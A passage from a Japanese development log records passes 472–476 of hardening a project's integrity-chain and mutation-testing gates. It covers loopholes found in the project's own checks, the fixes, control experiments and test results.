は既に保護対象) ② **変異検査に載せた** —— `lint:mutation-scope` が「保護対象なのに変異検査に載っていない」と**設計どおり鳴った**ので測ると **94.59% / 生存 2**。切り分け (パス 399 の 3 区分): `:118` の `raw.length === 0` は**等価** (空の配列は次の門が同じ `false` を返す) なので理由つき pragma・`:120` の `typeof last !== 'object'` は**本物の穴** —— `[undefined]` や疎な配列で**投げる**ようになるのに既存の標本 (`[null]` / `['x']` / `[turn(123)]`) では答えが変わらず区別できなかった → 標本を 2 つ足して **100.00% / Killed 34 / 生存 0 / 未到達 0** ③ **理由を `kind` で分類して機械で検める** (`chain:verify` の**検査 6**・両方向):

| kind | 件数 | 述語 |
| --- | ---: | --- |
| `type-only` | 2 | `export` はすべて `interface` / `type` |
| `paths-only` | 4 | 保護対象の読み手が `reads` の名前だけを import する |
| `guarded-by` | 2 | 名乗った `guardedBy` が全部保護対象 |
| `registry` | 2 | **理由に件数を書かない** (足すたびに変わる) |

④ **振る舞いは証人が持つ** (`exclusionReasonKinds.test.ts` · **7 件**) —— esbuild の出力が本当に 0 byte か・`import` 名が宣言の部分集合か。**`chain:verify` は CI で毎回走るので子プロセスをそこへ増やさない。**★ **対照 9 方向すべて鳴り、それぞれ狙った層に当たる** (A 検査 6 の門を骨抜きに ✗0 + 証人 ❌1 (配線) / B `type-only` の述語を常に通す ✗1 / C `paths-only` の「宣言の外」を見ない ✗1 / D `registry` の針を殺す ✗3 / E 分類の台帳から 1 行消す ✗1 + ❌2 / **F `assistantLimits` を除外へ戻す ✗2 + ❌2 (欠陥の再現)** / **G 理由に件数を書き戻す ✗2 + ❌2 (直す前の姿)** / H 逆向きを見ない ✗1 / I 関門の述語を潰す ❌2 (`assistantInputCap`))・復帰後 **✗0 / ❌0**。★ **B / C / D / H が証人を鳴らさないのは設計** —— 証人はゲートの述語を**借りない** (パス 476 の自戒)。★★ **自戒 2 つ**: ① **対照 A は 1 度目、何も鳴らさなかった** —— self-test も証人も判定を*関数として*呼ぶので、`cmdVerify` が結果を使わなくなっても見えない (**パス 472 / 475 / 476 と同じ形で 4 度目**)。**結果を使う形そのもの**を証人が要求して初めて鳴る ② **自分で書いた針が自分の説明文に当たった** —— `registry` の針を「2 桁以上の数」で書いたら、理由に足した経緯の日付と引用した数を 3 件拾った。針を「数 + 数え上げの語」と「現在 N」へ絞り、**経緯は理由の値ではなく上の注記へ**移した (パス 466 と同じ罠)。★ **測って何も無かった軸も記録する**: ① **残る 8 件の理由はどれも今日真** (`type-only` の 2 件は esbuild で 0 byte・`paths-only` の 4 件は `eraseAll.ts` の import 名と一致・`guarded-by` の 2 件が名乗る `externalUrlGate.ts` / `release.yml` / `httpLimits.ts` はどれも保護対象) ② **`registry` の 2 件は「関門ではない」も真** (未知の id を弾くのは `isServiceId`、総体の不変条件は `LIVE_FETCHERS` の起動時 throw が持つ)。`typecheck` 緑・`npm test` **909 / 19,211**・`verify:all` exit 0・`chain:verify` 緑 (block **#266**)・`assistantLimits.ts` の変異検査 **100.00%**。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-26 パス 476 後も 11,971,801 B / 3,384,320 B で byte 単位で不変 (md5 も同一)** (直したのは `scripts/` 2 本と `__tests__/` 1 本・`ontology/`・`security/`・`docs/` だけ —— **出荷コードは 1 行も動いていない**。それでも**両方を組んで md5 まで見た** (`fef32c62…` / `5e00fcdf…`)。**2 つの台帳は逆のことを意味するのに、門は「どちらでもよい」として受けていた —— ブラウザ版の保管庫を隣の台帳へ移すだけで、ハッシュの外へ出られた。** **見つけ方**: パス 475 は「保護対象の名前が**消える**」側を閉じた。残っていたのは**名前を隣の台帳へ移す**道である。手順は 3 つ —— ① `PROTECTED` から 1 行消す ② `DEP_EXCLUSIONS` に理由つきで足す ③ `DECLARED_REMOVALS` に `to-exclusions` として宣言する → `chain:append`。実測 (2026-09-26 · 隔離した写し (`git worktree`) で `src/renderer/security/vault.ts` を移す):

| 段 | 直す前 |
| --- | --- |
| `chain:append` | ✅ ブロックを採掘 |
| **`chain:verify`** | **✅ exit 0「保護対象 93 ファイルが tip と一致（閉包 OK: 除外 12 件は台帳どおり）」** |
| **`lint:mutation-scope`** | **✅ exit 0** |
| **その後に中身を 1 行書き換える** | **✅ exit 0** (tipManifest に居ないので映らない) |

★★ **`vault.ts` はブラウザ版の保管庫** (AES-GCM-256 · PBKDF2 600k · パス 361 が 2 つの書き込みを 1 トランザクションへ直した当のモジュール) で、`lint:mutation-scope` の**壁の名簿にも「マスターパスワードから鍵を作る所」として載っている**。つまり「必ず測る壁」が、名前を隣の台帳へ移すだけでハッシュの外へ出られた。★ **2 つの門が揃って黙った理由**:

| 門 | 何を見ていたか |
| --- | --- |
| `checkWallsAreProtected` | `protectedSet.has(file) \|\| excluded.has(file)` —— **どちらでもよい** |
| `to-exclusions` の述語 | 「その名前が `DEP_EXCLUSIONS` に在るか」—— **移した本人が書いた行** |

★ **`PROTECTED` は「中身のハッシュを取る」、`DEP_EXCLUSIONS` は「取らないと決めた」で、意味は逆である。** それを `||` で受けると移動が正当な手当てになる —— 断りの文面まで「**PROTECTED へ足すか、DEP_EXCLUSIONS に理由つきで載せること**」と**移動を案内していた**。★ **`moved` との非対称** —— `moved` は「同じ名前が今も保護対象に在る」= **移した本人には作れない事実**を見るのに、`to-exclusions` は**やったことを確かめていた**。★ **母集団を測った** (2026-09-26): 「必ず測る壁」**35** / 保護対象で満たす **34** / **除外台帳で満たす 1** (`src/shared/updateCheck.ts` · 鎖の #89 で宣言つきに移った) / どちらでもない 0 —— **だから道そのものは閉じない** (閉じると今日の実物が落ちる)。塞ぐのは**名指しされていない移動**のほうである。**直し**: ① **`WALLS_VIA_EXCLUSION`** (名指しの台帳・双方向・今日 1 行) —— 壁が除外の側で満たしてよいのはここに在るときだけ。逆向き (壁でなくなった / 保護対象へ戻った / 除外台帳から消えた) でも鳴る ② **`to-exclusions` は `heldBy` を名乗る** (判断を今持っている保護対象) —— ① それが保護対象であること ② **本当にそのファイルを読んでいること** を**閉包と同じ辺** (`dependencySpecs` + `resolveRelativeImport`) で確かめる (`protectedReadersOf`)。②は移した本人には作れない (辺を足すには読み手の側を編集することになり、そちらは保護対象なので鎖に出る) ③ 実物の `DECLARED_REMOVALS[89]` に `heldBy: 'src/main/main.ts'` (実測: `updateCheck.ts` を読む保護対象はこの 1 つだけ) ④ 証人 `protectedListShrink.test.ts` を **9 → 12 件**へ。★ **層は分けたままにする** —— 「壁がハッシュの外へ出る」を止めるのは壁の門で、鎖が止めるのは「誰が代わりに持つのかを言わないまま出ること」である。実測:

| 植えた形 | `chain:verify` | `lint:mutation-scope` |
| --- | --- | --- |
| 直す前 (宣言つき) | ✅ exit 0 | ✅ exit 0 |
| 直した後・`heldBy` 無し | ❌ exit 1 | ❌ exit 1 |
| 直した後・`heldBy` つき (正当な読み手) | ✅ exit 0 | **❌ exit 1** |

★★ **2 つ目の発見 —— パス 475 の証人の独立実装が、新しい形を読めなかった** (対照を回している途中で出た)。合成した新しい形の note (`update -src/renderer/security/vault.ts,integrity-chain.cjs`) で、ゲートは `vault.ts` を拾うのに証人は**名前 0 件**だった —— `removalsHere` に**動詞 (`update `) を外す段が無かった**。★ **それでも今日は一致していた** —— 歴史の 2 件 (#67 / #89) はどちらも削除が**2 番目**なので `,` で切れば `-` で始まる項が残る。**パス 475 が `block_note_changed` を「削除を先頭へ」直したので、実物がこれから出す形は通らない。** パス 475 の自戒 2 (「標本は、生産する側が実際に出す形にする」) と同じ形で、**直したのはゲートの側だけだった** —— 証人にも段を足し、**新旧両方の形を両実装に通す標本**を置いた (これが無いと対照 G が鳴らない)。★ **対照 7 方向すべて鳴り、それぞれ狙った層に当たる** (A 壁の門を `||` へ戻す 壁 self-test ✗2 + 証人 ❌1 + **決定的な対照が exit 0 へ戻る** / B 台帳の逆向きを消す ✗3 + ❌1 / C 台帳から `updateCheck.ts` を消す ✗2 + ❌1 + **実物の `lint:mutation-scope` が exit 1** / D `to-exclusions` を自己証明へ戻す 鎖 self-test ✗3 + ❌1 / E 実物の宣言から `heldBy` を外す ✗1 + ❌2 / F 読み手を「全部読んでいる」へ ✗2 + ❌2 / G 証人の独立実装から動詞を外す段を消す ❌1)・復帰後 **✗0 / ✗0 / ❌0**。★ **B は 1 度目、証人を鳴らさなかった** —— 証人は台帳の**中身**を自分で検めるので、門の逆向きのループを消しても通る (パス 472 / 475 と同じ形で **3 度目**)。門に**逆向きを訊く** 3 件を足して ❌1 になった。★ **直した後の全数測定** (2026-09-26 · 94 の保護対象を 1 つずつ落とす · 針を直して**94 / 94 に届いた**): 検査 5 が鳴る **94 / 94** / 検査 4 (閉包) も鳴る 53 / **検査 5 だけが鳴る 41** / どちらも黙る **0**。★ **パス 475 が publish した数を 2 つ訂正した**: ① 振る舞いの走査は「先頭 32 件で 9 件が SILENT」と書いたが実測は **35 行 / 11 件** ② **落とす道具は 94 のうち 73 件しか届いていなかった** —— 針が `'<rel>',` の**完全一致**で、行末に注記が付く行 (実測 21 件) を見なかった。静的な 29 は今も正しく、**上限であることも実測した** (`scripts/safe-vault-write.cjs` は 29 の中に在るが振る舞いでは検査が鳴る)。★ **測って何も無かった軸も記録する**: ① **除外台帳へ「移せない」名前も在る** —— `writeFieldLimits.ts` (どの保護対象も読んでいない) を移すと閉包の**逆向き**が「古い除外」として鳴る (実測 exit 1)。今日移せるのは「保護対象が読んでいる」名前だけである ② **除外台帳 11 件の理由はどれも今日真** —— 「実行時に残らない型定義のみ」の 2 件は esbuild で **0 byte**、「ハードリセットが読むのは置き場所の関数だけ」の 4 件は `eraseAll.ts` の import と一致。**機械は無い** (残作業へ —— 同じ注記が「`clients/types.ts` は『型だけ』と書いてあったが実行時の判断を持っていた」と過去の誤りを記録している) ③ **`scripts/lint-mutation-scope.cjs` は鎖の保護対象ではない** (頻繁に動くので「安定資産」の基準を満たさない)。`typecheck` 緑・`npm test` **908 / 19,204**・`verify:all` exit 0・`chain:verify` 緑 (block **#265**)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-26 パス 475 後も 11,971,801 B / 3,384,320 B で byte 単位で不変 (md5 も同一)** (直したのは `scripts/` 1 本と `__tests__/` 1 本 (新設)・`ontology/`・`security/`・`docs/` だけ —— **出荷コードは 1 行も動いていない**。それでも**両方を組んで md5 まで見た** (`fef32c62…` / `5e00fcdf…`)。**94 の保護対象を決めている名簿そのものが無縛で、1 行消して `chain:append` すれば `chain:verify` は緑だった。** **見つけ方**: パス 469〜474 は「走査が一部死んだとき」を 25 ゲートについて測ったが、`chain:verify` だけは `not-thinnable` (母集団が名指しの一覧なので `readdirSync` を間引いても 1 件も落ちない) として**測っていない**と記録した。その 6 パス分の残りがこれである。実測 (2026-09-26 · 隔離した写し (`git worktree`) で `PROTECTED` から `'vite.config.ts',` を 1 行消す):

| 段 | 直す前 |
| --- | --- |
| `chain:append` | ✅ ブロックを採掘 |
| **`chain:verify`** | **✅ exit 0「保護対象 93 ファイルが tip と一致」** |
| `lint:mutation-scope` | ✅ exit 0 |

★ **検査 1〜4 はどれも「*今の* 一覧が tip と合っているか」を問う**ので、append が新しい tip を 93 件で作り直した時点で全部満たされる。閉包の検査も、その名前を**他の保護対象が読んでいなければ**何も言わない。★★ **`vite.config.ts` はパス 347 が「どのゲートにも鎖にも入っていない」として鎖へ入れた当のファイル**である —— つまりその修復は、1 行消して append するだけで静かに元へ戻せた (`docs/PROXY_EXAMPLE.md` = パス 349 も同じ)。★ **母集団を測った** (94 の保護対象を 1 つずつ落として、どちらの機構が鳴るか):

| 何が鳴るか | 件数 |
| --- | ---: |
| 閉包 (他の保護対象がその名前を読む) | 50 |
| 壁の名簿 (`MUST_MEASURE`) | 34 |
| **どちらも鳴らない** | **29** |

★ 29 の中身は、**最近のパスが「無縛だから」と鎖へ入れた当のファイル**が並ぶ —— 直下の設定 4 本 (パス 347)・`docs/PROXY_EXAMPLE.md` (349)・`assets/manifest.webmanifest` (363)・`.claude/settings.json` (370)・`.cursor/rules/*.mdc` 4 本 (372)・workflow 3 本・`recordCipher.ts`・`LockScreen.tsx`・そして**`scripts/integrity-chain.cjs` 自身**。★★ **証拠は鎖がもう持っていた —— 読む物が無かっただけである** —— ブロックは `leafCount` と `note` を持ち、**どちらも `blockHash` に入る**ので後から書き換えられない。実測 (263 ブロック):

| 合図 | 見つかったブロック |
| --- | --- |
| `leafCount` が減った | #89 (50 → 49) |
| `note` に `-名前` | **#67 (delta 0)** / #89 |

★★ **#67 は件数では見えない** —— 同じ append で 1 件出て 1 件入ったので `leafCount` が動かない。**数だけを見る門はこの形に盲目**で、だから**合図は 2 つ要る**。★ **今日の 2 件はどちらも正当だった** (#67 は `renderer/security/` → `shared/` への移動・#89 は除外台帳への移動) が、**それを確かめた物は何も無かった** —— つまりこれは**罠の除去**であって、既に起きた事故の修復ではない (パス 359 / 398 / 439 / 461 と同じ位置づけ)。**直し**: ① **`block_note_changed` は外れた物を全部・完全な道で残す** —— 以前は変更と削除を混ぜて先頭 6 件で切っており、実測 **9 ブロック**が 6 件に届いていた (7 件以上動いた append では削除が枠から押し出されうる)。切るのは変更の側だけにした ② **`DECLARED_REMOVALS` (2 行) + `collectRemovalProblems`** を `chain:verify` の**検査 5** として足す (`verify:all` と `ci.yml` の両方に在る)。**両方向** —— 宣言の無い削除も、履歴に無い宣言も鳴る ③ **`kind` は機械で検める** (`moved` / `to-exclusions` の閉じた 2 語) —— 理由の散文だけだと「移った」と書いて実は消えていても通る ④ 外側の証人 `src/shared/__tests__/protectedListShrink.test.ts` (**9 件**) が**委ねた鎖の JSON から独立に**合図を数え直す。★ **対照 7 方向すべて鳴り、それぞれ狙った層に当たる** (A 門を `if (false && …)` へ ✗0 + 証人 ❌1 + **決定的な対照が exit 0 で欠陥を再現** / B note の動詞 (`update`) を外す処理を消す ✗7 + ❌1 / C note を切り捨てる旧い形へ戻す ✗1 + ❌1 / D 台帳から #89 を消す ✗1 + ❌2 / E 履歴に無い #99 を台帳へ (逆向き) ✗1 + ❌3 / F #89 の `kind` を `moved` へ ✗1 + ❌2 / G `REMOVAL_KINDS` が何でも通す ✗1 + ❌1)・復帰後 **✗0 / ❌0 / 決定的 exit 1**。★★ **自戒 3 つ —— どれも対照が教えた**: ① **対照 A は 1 度目、self-test も証人も鳴らさなかった** —— どちらも判定を*関数として*呼ぶので、`cmdVerify` が結果を使わなくなっても見えない (**パス 472 とまったく同じ形**)。**結果を使う形そのもの** (`if (removals.length > 0) fail(`) を証人が要求して初めて鳴る ② **私の標本が、私が作ったばかりの形を 1 度も通していなかった** —— 削除を note の**先頭**へ移したのに、self-test と証人の標本はどちらも削除を 2 番目に置いていた (= 旧い形)。先頭に来ると `update ` という動詞が貼り付いて `-` で始まらず、**合図を落とす**。決定的な対照の文面が「(note に名前が無い)」と出て初めて分かった。**標本は、生産する側が実際に出す形にする。** ③ **対照 G が鳴らなかった** —— 証人がゲートの述語を**借りて** `true` を期待していたので、述語を `() => true` へ骨抜きにしても通った (パス 402 の「床を床の値で主張しない」と同じ形)。独立に書き直して**両方向で**突き合わせる形にした。★ **測って何も無かった軸も記録する**: ① **`lint:mutation-scope` の逆向き (`checkProtectedAreMeasured`) は鳴らない** —— 一覧が縮むと要求する項目も減るので**より緑になる**方向である ② **ゲート層での D / E / F の測定は交絡している** —— `integrity-chain.cjs` はそれ自身が保護対象なので、台帳を編集した瞬間に検査 2 (Merkle) が先に落ちる。交絡していない層は証人の側である (パス 473 / 474 の「道具が測る対象に見える」と同じ家系) ③ **4 つ目の包みは書かなかった** —— `PROTECTED` を間引く包みを足しても、現実的な形は「1 行消して `chain:append`」なので `THINNING['chain:verify'] = 'not-dropped'` は今も正しい ④ **94 件の振る舞いの走査は完走していない** (実測できたのは先頭 32 件で、うち 9 件が `SILENT`・どれも静的に数えた 29 の中に在る。静的な 29 は**上限**である)。`typecheck` 緑・`npm test` **908 / 19,201**・`verify:all` exit 0・`chain:verify` 緑 (block **#263**)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-26 パス 474 後も 11,971,801 B / 3,384,320 B で byte 単位で不変 (md5 も同一)** (直したのは `scripts/` 2 本と `__tests__/` 1 本・`ontology/`・`docs/` だけ —— **出荷コードは 1 行も動いていない**。それでも**両方を組んで md5 まで見た** (`fef32c62…` / `5e00fcdf…`)。**差し込むのをやめたら `chain:verify` が初めて測れた —— 94 の保護対象を守る門が「走査の一部の死」に耐えるかは、パス 469〜473 を通して 1 度も分かっていなかった。** **見つけ方**: パス 473 が台帳に載せた「道具が見えている 2 本」は**どちらも原因が同じ** (原文を 1 行書き換えたこと) だったので、`NODE_OPTIONS=--require` で**外から注入する**形へ移した。実測 (2026-09-26):

| ゲート | 差し込むと | 外から注入すると |
| --- | --- | --- |
| `chain:verify` | **exit 1** (自分の原文のハッシュが合わない) | **exit 0 (透明)** |
| `verify:arch` | 足した 1 行が `tracked line count` に出る (967617 → 967618) | **透明** |
| **合計** | 透明 23 / 見えている 2 | **透明 25 / 見えている 0** |

★ **`chain:verify` の答えは `not-dropped`** (母集団が名指しの保護対象の一覧なので `readdirSync` では 1 件も落ちない) で、**理由が 2 つから 1 つに減った** —— 「落とせない」だけが残り、「道具が違反だから測れない」は消えた。★★ **外から注入すると子プロセスも前置きを読む (3 つ目の発見)** —— `NODE_OPTIONS` は子に伝わるので、1 つのファイルへ報告を書くと**最後に終わった子が親を上書きする**。実測: `verify:arch` (子を 6 回 spawn する) の報告が `kept: 0, dropped: 0` になり**親が落とした件数が丸ごと消えた** —— それを「落とせていない」と読むと鳴った理由がすり替わる (パス 470 の忠実さの教訓と同じ形)。前置きは `<OUT>/<pid>.json` を置き、呼ぶ側が足す。★ **報告は木の外へ (4 つ目 —— 罠であって生きた欠陥ではない)** —— `runPartial` は報告を**木の根**へ書いており、木を走査するゲートがその 1 件を数えていた (実測: `lint:charset` の走査が **1663 → 1664**)。**終了コードは 25 / 25 で動かない**ので判定はひっくり返らず、だから**対照は「判定がひっくり返る」形では取れない** —— `reportDirFor(wt)` を切り出して「返す道は木の外」を**不変条件**として self-test が標本で見る。★ **台帳が 0 件になった —— それは「要らない」ではない** (パス 385 の判断と同じ)。床は**「0 件でない」には置かない** (台帳は減るのが正しい向きで、実測に張り付けた床は直した日に落ちる門になる · パス 378)。機構が生きていることは**合成のゲート名**の標本が見る —— 実在する見えているゲートに依ると台帳が空になった日に標本が死ぬので、`partialVerdict` は台帳を引数で受け取る形にした。★ **対照 5 方向すべて鳴り、それぞれ狙った層に当たる** (A `--baseline` を差し込みへ戻す ❌2 —— **`verify:arch` = output / `chain:verify` = exit-code で欠陥がそのまま再現** / B 報告を 1 つのファイルへ戻す `--partial` ❌1 (**`verify:arch` が `not-dropped exit=1 落とした=0`**) / C' 報告のディレクトリを木の中へ self-test ✗1 / D `TRANSPARENCY` に透明なゲートを足す 証人 ❌1 / E 判定が合成の台帳を無視する 証人 ❌1)・復帰後 **21 / 21**。★★ **鳴らなかった対照が 1 つ在り、それは報せだった** —— 最初の C (報告のディレクトリを木の中へ置いて `--baseline` を回す) は鳴らなかった: `--baseline` は間引きを掛けないので**前置きが即 return し、報告ファイルが1 つも書かれない**。空の隠しディレクトリは走査に数えられない。**鳴らない対照は合格ではなく、その対照についての報せ**なので、判定の層ではなく**不変条件の層**へ当て直した。★ **自戒**: **`ENFORCEMENT` の行を `THINNING` の形で上書きした** —— `src.index("'chain:verify': {")` が先に来る `ENFORCEMENT` に当たった (**パス 472 とまったく同じ罠で 2 度目**)。`by` が消えて `expect` が入り、`THINNING` の側は直っていなかった。両方を宣言の位置から探し直して直した。`typecheck` 緑・`npm test` **907 / 19,192**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)・`audit:gate-partial` **73 / 73 組**・`audit:gate-baseline` **25 / 25 (透明 25 / 見えている 0)**。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-26 パス 473 後も 11,971,801 B / 3,384,320 B で byte 単位で不変 (md5 も同一)** (直したのは `scripts/` 1 本と `__tests__/` 2 本・`ontology/`・`package.json`・`docs/` だけ —— **出荷コードは 1 行も動いていない**。それでも**両方を組んで md5 まで見た** (`fef32c62…` / `5e00fcdf…`)。**測る道具そのものが測る対象に見えていた —— `chain:verify` は自分の原文をハッシュするので、前置きを差し込むことがその門が検出する違反そのものだった。** **見つけ方**: task #150 は当初「`readFileSync` を包んで、本文が一部だけ返る形を測る」だったが、**実測して捨てた**。25 ゲートの列挙の原始命令を**注記を落として**数えると `readdirSync` 24 / `execFileSync` 2 / `execSync` 2 / `spawnSync` 1 で、`globSync` は **0 件** (最初の grep は `verify-architecture.cjs:2024` の **docblock の引用**を拾っていた · `mention-vs-declaration`)。`lint-shell` の `spawnSync` は `bash -n` と `--self-test` で**列挙ではない**し、`readFileSync` に長さを渡すゲートは **0 件** —— **前置きの届く範囲は今日の母集団を覆っている**ので3 つ目の包みは要らない。★ **代わりに出たのが本物** —— `injectPreamble` は前置きを**行 0** (shebang があれば 1) に差し込むが、ゲートの本の 1 行目は `"use strict";` なので、その**前**に `require(...)` が入ると directive prologue が終わり**その本は sloppy mode で走る** (実測: 素は `ReferenceError`、`require` を前に置くと**黙って global を作る**)。**向きが重い** —— sloppy は許す側なので**偽の `silent`** を作る向きで、パス 469〜472 が報告した「黙ったゲート」の信用に直に関わる。実測 (2026-09-26 · 素の実行と「差し込んで 1 件も落とさない実行」を 25 ゲートで突き合わせる):

| | |
| --- | ---: |
| 答えが同じ (透明) | **23** |
| 出力だけが違う | 1 (`verify:arch`) |
| **終了コードが違う** | **1 (`chain:verify`)** |
| **strict mode の喪失が答えを変えた件数** | **0 / 25** |

★ **`chain:verify` は原理的に測れない** —— `integrity-chain.cjs` は**それ自身が保護対象**なので、間引きを 1 件も掛けなくても exit 1「変更: integrity-chain.cjs」になる。`verify:arch` の差は**差し込んだ 1 行**が `tracked line count` に出るだけ (967617 → 967618) で、**床は 600000 なので判定は動かない**。★ **そして直す前の判定は見分けられなかった** —— `report.dropped === 0` が `status` より先に短絡するので exit 1 は見えず、台帳は `not-dropped` で通っていた。**今日は隠れているだけで、`integrity-chain.cjs` に走査が 1 つ入った日に `dropped > 0` になり、判定は `status !== 0` を見て `rings` と答える** = 「走査が一部死んでも chain:verify は鳴る」という**偽の結論**が出る形だった (パス 468 の `needle` と同じ形 ——「空にできなかった」を「床が在る」と読まない —— の、**終了コードについての現れ**)。**直し**: ① 差し込む位置を directive prologue の後ろへ (`preambleInsertAt`。行注記と空行は飛ばすが**ブロック注記は意図して跨がない** —— 複数行を数え始めるとそこが 2 つ目の字句解析器になる) ② 透明性の台帳 `TRANSPARENCY` は**見えている物だけ**を載せる (透明な 23 本の理由を並べると理由の欄が保留の置き場になる · パス 461 の判断)。双方向は `--baseline` が**実測で**持つ ③ 判定を純関数 `partialVerdict` へ出し、`dropped` より**前**に透明性を問って `instrument-rings` として区別する (語彙を 3 つ目へ) —— **純関数に出したのは対照が self-test の層で鳴るようにするため** (埋まっていると隔離した写しでゲートを走らせる高い道具でしか映らない · パス 472 の自戒と同じ形) ④ `npm run audit:gate-baseline` (新しいモード・CI では走らせない)。★ **対照 9 方向すべて鳴り、それぞれ狙った層に当たる** (A 差し込む位置を行 0 へ戻す self-test ✗4 / B 判定から透明性を外す `--partial` ❌1 / **B' 同 (純関数の後) self-test ✗1 —— 層が下りた** / C 台帳から `chain:verify` を消す ✗2 / D 透明なゲートを台帳へ足す `--baseline` ❌3 / E 知らない `visible` の語 ✗3 / F `expect` を `not-dropped` へ戻す ✗1 / G 判定の順序を戻す (証人) ❌1 / H 差し込む位置を行 0 へ (証人) ❌1)・復帰後 **21 / 21**。★ **ゲートが 2 つ捕まえた —— どちらも設計どおり**: ① `commentStripperCensus` が `preambleInsertAt` を「14 個目の自前の注記除去」として鳴らした (**注記を落とす物ではなく directive prologue の切れ目を探す物**なので理由つきで免除へ —— 本文からは 1 文字も落とさない) ② 既存の閉じた語彙の検査が 3 つ目の語をその場で捕まえた。★ **自戒 2 つ**: ① **`laws.ts` に `"use strict"` を単一引用符の文字列の中へ書いて構文を壊した** —— 3 つのオントロジー検査が**読み込みに失敗**し (`Tests no tests` / `Transform failed`)、`npm test` は 「4 files failed / 1 test failed」と出た。**「ファイルが落ちた」と「検査が落ちた」の差が読み込みの失敗である** (パス 412 と同じ形) ② **self-test の標本に予想を書いて外した** —— `integrity-chain.cjs` は shebang を持つので差し込む位置は 2 なのに 1 と書き、self-test が直させた。★ **測って何も無かった軸も記録する**: ① **strict mode の喪失は今日どのゲートの答えも変えていない** (25 / 25) —— **罠であって生きた欠陥ではない**が、次に strict に依るゲートが入った日に静かに誤測されるので直した ② **`verify:arch` の +1 行は床を脅かさない** (967618 vs 床 600000) ③ **`chain:verify` が一部の死に耐えるかは今も未測定** —— ただし今は「測っていない」ではなく**「この道具では測れない」**と理由つきで分かっている。`typecheck` 緑・`npm test` **907 / 19,192**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)・`audit:gate-partial` **73 / 73 組**・`audit:gate-baseline` **25 / 25 (透明 23 / 見えている 2)**。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-26 パス 472 後も 11,971,801 B / 3,384,320 B で byte 単位で不変 (md5 も同一)** (直したのは `scripts/` 10 本と `__tests__/` 2 本・`ontology/`・`docs/` だけ —— **出荷コードは 1 行も動いていない**。それでも**両方を組んで md5 まで見た** (`fef32c62…` / `5e00fcdf…`)。**測った母集団が 8 本で、実際は 25 本だった —— 残り 17 本のうち 9 本が 1% の損失で黙り、`vault:check` は 0 件比べて「7402 ファイル同期」と刷っていた。** **見つけ方**: パス 471 が残した問い (「`acceptPath` を持つべきゲートが他に在るか」) を測りに行ったら、**答えより先に母集団の狭さが出た** —— パス 469〜471 の `PARTIAL_GATES` は**手書きの 8 本**で、`verify:all` の 37 ゲートのうち**間引けるのは 25 本**だった。実測 (2026-09-26 · 隔離した写しの上で `readdirSync` を一様に間引く · keep 99% = 1% 死):

| | |
| --- | ---: |
| 間引けるゲート (木を歩く 24 + git の一覧だけの 1) | **25** |
| 直す前に鳴った | 14 |
| **直す前に黙った** | **9** |
| 落とせなかった (母集団が名指しの一覧) | 1 (`chain:verify`) |
| **直した後** | **鳴る 24 / 黙る 0** (73 組すべて台帳どおり) |

★ **9 / 9 で決定的な対照が取れた** —— 本物の違反を植えて、そのファイルだけを走査から落とす:

| ゲート | 植えた違反 | 素の木 | 1 本落とす |
| --- | --- | --- | --- |
| **`vault:check`** | (何も植えず `.md` を全部落とす) | — | **✅「同期しています（7402 ファイル）」で 0 件比べた** |
| 同 | 知識ノート 1 件を改ざん | ❌ 内容差分 | **✅** |
| **`lint:workflow-security`** | `pull_request_target` + 未固定 action | ❌ 2 件 | **✅ 7 / 7 で消え 6 / 7 は exit 0** |
| `lint:docs` | 「not in CI」のゲートを workflow が実行 | ❌ 1 件 | ✅ |
| `lint:test-coverage` | vitest の include に入らない検査ファイル | ❌ 1 件 | ✅ |
| `lint:storage` | 台帳に無い localStorage の保存先 | ❌ | ✅ |
| `lint:ipc-handlers` | payload の書き出し先を関門なしで書く | ❌ 1 件 | ✅ |
| `lint:mutation-scope` | mutate の外に広い無効化 | ❌ 1 件 | ✅ |
| `lint:parameter-prose` | 台帳の定数を直接使う | ❌ 1 件 | ✅ |
| `lint:rate-freshness` | 台帳に無い期限の定数 | ❌ | ✅ |

★ **いちばん重いのは `vault:check` で、成功行が偽だった** —— **7402 はコーパスの件数で、比べた件数ではない**。内容の照合は `want` (生成側の走査が見た物) の中だけを回るので、名前が 1 つ落ちるとその 1 件は「欠落」にも「余分」にも「内容差分」にも現れず、しかも**同じ間引きが両方の歩きに掛かるので比較そのものが打ち消し合う**。守る対象は 7,402 ノートのコーパス (AI オーケストレーションの文脈として注入される) である。★ **`lint:workflow-security` は CI 自身を守る門** —— 床は `MIN_WORKFLOWS = 3` で実測 7 なので**4 本消えても届かない**。`release.yml` は署名鍵 4 本と `GH_TOKEN` を env に持つ。★ **直し**: ① 9 本に `trackedCrossCheck` (パス 471 の共有モジュール) を通し、条件はゲート自身が `CROSS_CHECK` として宣言して**走査と照合が同じ定数を読む** ② `vault:check` には床を 1 つ —— **「比べた件数 == 刷る件数」** (割合ではなく**同一性**。成功行が `count` を名乗るのだから、比べた件数がそれと一致していなければその行は自分が確かめていない数を刷っている) ③ **`acceptPath` は 9 本のうち 7 本が要った** (根の下の部分木 `src/renderer/` `src/main/clients/` と、再帰しない平らな走査 `.github/workflows/` `src/shared/`) —— パス 471 の残作業の答え ④ 道具の母集団を**走査で導く** (`thinnableGates()`)・`THINNING` と `ENFORCEMENT` を 25 本へ・機構の語彙を **3 → 10 語**へ ⑤ `lint:docs` に `require.main` の番 (読み込むだけで `process.exit` していたので外から証人を立てられなかった —— `lint-test-coverage` / `build-knowledge-vault` と同じ番)。★ **鳴った 14 本に照合は足していない** —— どれも別の機構 (名指しの走査・台帳の双方向・生成物の byte 一致・副作用としての床・文書のメトリクス) で**割合に依らず**鳴る (弱くなっていない所に床を足さない · パス 469 の判断)。★ **対照 10 方向すべて鳴り、それぞれ狙った層に当たる** (A `vault:check` の床を外す / B 同の照合を外す / C `workflow-security` の照合を外す —— **この 3 つは 1 度目に鳴らなかった** / D `CROSS_CHECK` の export を落とす ❌2 / E `ENFORCEMENT` から 1 本消す ❌1 + self-test ✗1 / F 母集団を「木を歩く」だけに戻す ❌1 + ✗1 / G 未知の機構を名乗る ❌1 + ✗1 / H `not-thinnable` を 2 本目に名乗らせる ❌1 / I 実物を戻して道具が `silent` と報告 / J 同じく 